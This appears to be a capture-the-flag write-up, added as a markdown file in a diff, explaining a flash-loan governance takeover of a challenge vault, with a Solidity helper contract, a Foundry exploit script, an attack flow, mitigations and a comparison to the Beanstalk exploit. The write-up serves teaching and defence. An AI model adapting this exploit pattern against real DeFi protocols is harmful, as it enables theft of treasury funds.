@@ -1,0 +1,343 @@
+# CTF – Flash Loan Governance Takeover
+
+## Overview
+
+The objective of this challenge is to drain all Ether from the `CivicVault` by abusing the governance system.
+
+At first glance, the protocol appears secure. Only the `CivicCouncil` contract is authorized to instruct the vault to send payments, and proposals require more than **25% of the total token supply** to pass.
+
+However, the protocol contains a critical design flaw: governance voting power is determined from a **snapshot taken during proposal creation**, while the governance token can be temporarily borrowed through a flash-loan-like mechanism provided by `CivicCustody`.
+
+By borrowing governance tokens, creating a proposal during the callback, executing it immediately, and returning the borrowed tokens before the transaction finishes, an attacker gains temporary voting power that becomes permanently recorded in the proposal snapshot.
+
+---
+
+# System Architecture
+
+The protocol consists of four main contracts:
+
+### CivicVault
+
+Stores the protocol funds.
+
+```text id="5m4jqw"
+500 ETH
+```
+
+Only the governance contract can authorize payments.
+
+---
+
+### CivicCouncil
+
+Responsible for governance.
+
+Proposal execution requires:
+
+```solidity id="jlwmj8"
+votes > totalSupply / 4
+```
+
+With:
+
+```text id="0j3r4o"
+Total Supply = 6,000,000 CVC
+
+Required Votes = 1,500,000 CVC
+```
+
+Voting power is determined by:
+
+```solidity id="jjlwm4"
+balanceOfAt(msg.sender, snapshotId)
+```
+
+meaning the token balance is frozen at proposal creation.
+
+---
+
+### CivicCustody
+
+Provides temporary custody of governance tokens.
+
+The vulnerable function is:
+
+```solidity id="jlwmq2"
+token.transfer(msg.sender, amount);
+
+ICustodyRecipient(msg.sender).receiveCustody(amount);
+
+require(
+    token.balanceOf(address(this)) >= balanceBefore,
+    "custody not restored"
+);
+```
+
+The tokens are transferred **before** the callback executes.
+
+Only after the callback finishes does the contract verify that the tokens have been returned.
+
+This effectively behaves like a flash loan.
+
+---
+
+# Root Cause
+
+The vulnerability results from combining two independent design decisions:
+
+1. Governance snapshots record voting power immediately when a proposal is created.
+2. The custody contract temporarily transfers governance tokens before requiring them to be returned.
+
+Because the proposal snapshot occurs while the attacker temporarily owns the borrowed tokens, the governance system permanently records voting power that never truly belonged to the attacker.
+
+The borrowed tokens are returned only after the malicious proposal has already been created and executed.
+
+---
+
+# Understanding the Vulnerability
+
+Execution begins with:
+
+```text id="jlwm90"
+checkout(2,000,000 CVC)
+```
+
+The custody contract performs:
+
+```text id="jlwm91"
+Transfer Tokens
+        │
+        ▼
+Callback Executes
+        │
+        ▼
+Verify Tokens Returned
+```
+
+During the callback, the attacker genuinely owns:
+
+```text id="jlwm92"
+2,000,000 CVC
+```
+
+Since:
+
+```text id="jlwm93"
+2,000,000 > 1,500,000
+```
+
+the governance threshold is satisfied.
+
+The proposal snapshot permanently records:
+
+```text id="jlwm94"
+Votes = 2,000,000
+```
+
+Even after the borrowed tokens are returned, the proposal continues to reference the snapshot rather than the attacker's current balance.
+
+---
+
+# Exploit
+
+The attacker deploys a helper contract implementing the custody callback interface.
+
+```solidity id="jlwm95"
+contract TakeoverHelper is ICustodyRecipient {
+    CivicCouncil public council;
+    CivicToken public token;
+    CivicCustody public custody;
+    address payable public player;
+
+    constructor(
+        CivicCouncil _council,
+        CivicToken _token,
+        CivicCustody _custody,
+        address payable _player
+    ) {
+        council = _council;
+        token = _token;
+        custody = _custody;
+        player = _player;
+    }
+
+    function attack() external {
+        uint256 custodyBalance =
+            token.balanceOf(address(custody));
+
+        custody.checkout(custodyBalance);
+    }
+
+    function receiveCustody(uint256 amount)
+        external
+        override
+    {
+        uint256 vaultBalance =
+            address(council.vault()).balance;
+
+        uint256 proposalId =
+            council.propose(player, vaultBalance);
+
+        council.execute(proposalId);
+
+        token.transfer(address(custody), amount);
+    }
+
+    receive() external payable {}
+}
+```
+
+Exploit script:
+
+```solidity id="jlwm96"
+function run() external {
+    vm.startBroadcast(PLAYER_PRIVATE_KEY);
+
+    TakeoverHelper helper =
+        new TakeoverHelper(
+            civicCouncilInstance,
+            civicCouncilInstance.token(),
+            civicCouncilInstance.custody(),
+            payable(PLAYER_ADDRESS)
+        );
+
+    helper.attack();
+
+    vm.stopBroadcast();
+}
+```
+
+---
+
+# Attack Flow
+
+```text id="jlwm97"
+Helper.attack()
+        │
+        ▼
+checkout(2,000,000 CVC)
+        │
+        ▼
+Tokens Transferred
+        │
+        ▼
+receiveCustody()
+        │
+        ▼
+Create Proposal
+        │
+        ▼
+Snapshot Records
+2,000,000 Votes
+        │
+        ▼
+Execute Proposal
+        │
+        ▼
+Vault Sends 500 ETH
+        │
+        ▼
+Return Borrowed Tokens
+        │
+        ▼
+Custody Balance Restored
+        │
+        ▼
+Challenge Solved
+```
+
+---
+
+# Why the Attack Works
+
+The key observation is that the proposal snapshot is taken **while the flash-loaned governance tokens are still owned by the attacker**.
+
+Although ownership lasts only for the duration of a single callback, the governance system permanently records the temporary balance.
+
+The custody contract verifies only that its tokens are eventually returned—it does not restrict what the borrower may do while holding them.
+
+As a result:
+
+* Governance records **2,000,000 votes**.
+* The proposal immediately satisfies the execution threshold.
+* The vault transfers **500 ETH**.
+* The attacker returns every borrowed token.
+
+From the custody contract's perspective, nothing appears abnormal.
+
+---
+
+# Security Impact
+
+This is a classic **Flash Loan Governance Attack**.
+
+Temporary voting power is transformed into permanent governance authority by abusing snapshot timing.
+
+An attacker can:
+
+* Pass malicious governance proposals.
+* Drain protocol treasuries.
+* Upgrade contracts maliciously.
+* Transfer ownership.
+* Execute arbitrary privileged actions.
+
+Because flash loans require little or no upfront capital, governance systems that rely solely on instantaneous token balances become highly vulnerable.
+
+---
+
+# Recommended Mitigation
+
+Protocols should never determine governance power using balances that can be borrowed within the same transaction.
+
+Recommended defenses include:
+
+* Enforcing a voting delay between proposal creation and execution.
+* Requiring voting tokens to be locked for a minimum duration.
+* Ignoring balances acquired within the current transaction.
+* Using time-weighted or historical voting power instead of instantaneous balances.
+* Restricting flash-loaned tokens from participating in governance.
+
+These measures ensure governance reflects long-term token ownership rather than temporary borrowing.
+
+---
+
+# Real-World Example
+
+A nearly identical attack occurred during the **Beanstalk Protocol** governance exploit in April 2022.
+
+An attacker borrowed governance tokens through a flash loan, accumulated enough voting power to approve a malicious proposal, executed it immediately, repaid the borrowed tokens, and extracted approximately **$182 million** from the protocol—all within a single transaction.
+
+This challenge demonstrates the same class of vulnerability on a simplified system.
+
+---
+
+# Key Takeaways
+
+* Flash loans can temporarily grant enormous voting power.
+* Governance snapshots must not rely on balances that can be borrowed within the same transaction.
+* Callback-based token custody introduces powerful execution opportunities for attackers.
+* Snapshot timing is just as important as access control.
+* Governance systems should reward long-term ownership, not temporary liquidity.
+
+---
+
+# Exploit Summary
+
+```solidity id="jlwm98"
+function receiveCustody(uint256 amount)
+    external
+    override
+{
+    uint256 vaultBalance =
+        address(council.vault()).balance;
+
+    uint256 proposalId =
+        council.propose(player, vaultBalance);
+
+    council.execute(proposalId);
+
+    token.transfer(address(custody), amount);
+}
+```
+
+The exploit borrows the entire governance token balance from the custody contract, creates a proposal while temporarily holding more than 25% of the token supply, immediately executes the proposal to transfer all funds from the vault to the attacker, and finally returns the borrowed tokens before the custody contract verifies repayment. Although the borrowed tokens exist only briefly, the governance snapshot permanently records the attacker's temporary voting power, allowing full control over the protocol.
